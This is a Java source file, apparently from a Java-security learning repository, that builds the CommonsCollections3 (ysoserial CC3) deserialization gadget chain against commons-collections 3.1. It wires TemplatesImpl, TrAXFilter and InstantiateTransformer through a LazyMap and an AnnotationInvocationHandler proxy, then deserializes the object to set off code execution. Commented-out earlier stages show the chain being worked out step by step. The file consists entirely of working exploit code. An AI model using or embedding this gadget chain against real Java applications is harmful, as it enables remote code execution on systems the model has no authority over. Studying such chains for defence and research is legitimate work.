package com.pacemrc.javasec.deserialize.ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import com.pacemrc.javasec.utils.*;
/**
 * 动态加载
 * commons-collections:3.1
 */
public class CC3 {


    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = Sinks.getTemplatesImplSink();
        //1111111
//        templates.newTransformer();
        //2222222
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(templates),
//                new InvokerTransformer("newTransformer",null,null)
//        };
//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(1);
        //33333333
//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
//        instantiateTransformer.transform(TrAXFilter.class);
        //4444444
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);
        Class clz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        Map mapProxy =  (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, handler);
        Object obj = constructor.newInstance(Override.class, mapProxy);

        Deserialize.doSerialAndDeserial(obj);

    }
}
